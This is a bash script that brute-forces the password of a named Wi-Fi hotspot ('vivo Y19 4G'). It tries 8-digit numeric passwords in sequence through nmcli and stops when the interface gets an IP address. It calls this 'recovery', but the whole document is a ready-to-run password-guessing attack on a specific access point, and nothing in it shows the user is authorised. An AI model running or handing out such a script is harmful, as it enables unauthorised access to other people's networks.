#!/bin/bash

# Check if running as root
if [ "$EUID" -ne 0 ]; then
  echo "[-] Please run as root (e.g., sudo ./script.sh)"
  exit 1
fi

TARGET_SSID="vivo Y19 4G"
INTERFACE="wlan0" # Replace with your exact interface name (check 'iwconfig' or 'ip a')

echo "[*] Starting sequential recovery on $TARGET_SSID..."

# Use sequence generation for speed without heavy nested loops
for pwd in $(seq -f "%08g" 11111111 88888888); do
    
    # Attempt connection with a strict 3-second timeout to prevent hangs
    nmcli --wait 3 device wifi connect "$TARGET_SSID" password "$pwd" > /dev/null 2>&1
    
    # Instantly check if the interface successfully got an IP address
    if ip addr show dev "$INTERFACE" | grep -q "inet "; then
        echo -e "\n[+] Success! Password found: $pwd"
        exit 0
    fi
    
    # Optional visual indicator that the script is running
    echo -ne "Testing: $pwd\r"
done

echo -e "\n[-] Password not found in 8-digit range."
